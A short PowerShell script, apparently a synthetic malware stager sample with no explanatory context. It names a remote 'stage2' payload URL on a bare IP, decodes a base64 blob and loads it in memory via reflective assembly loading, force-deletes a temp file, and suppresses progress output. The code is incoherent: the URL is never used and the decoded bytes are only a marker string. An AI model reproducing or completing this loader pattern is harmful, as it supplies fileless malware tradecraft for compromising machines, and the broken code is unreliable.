
$Stage2Url = "https://198.51.100.244:443/payload.bin"
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpmMDRwMmxseGIw')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$FetchResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $FetchResult) {
    Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = "SilentlyContinue"
Write-Verbose "Validating result"
Write-Verbose "Inspecting process list"
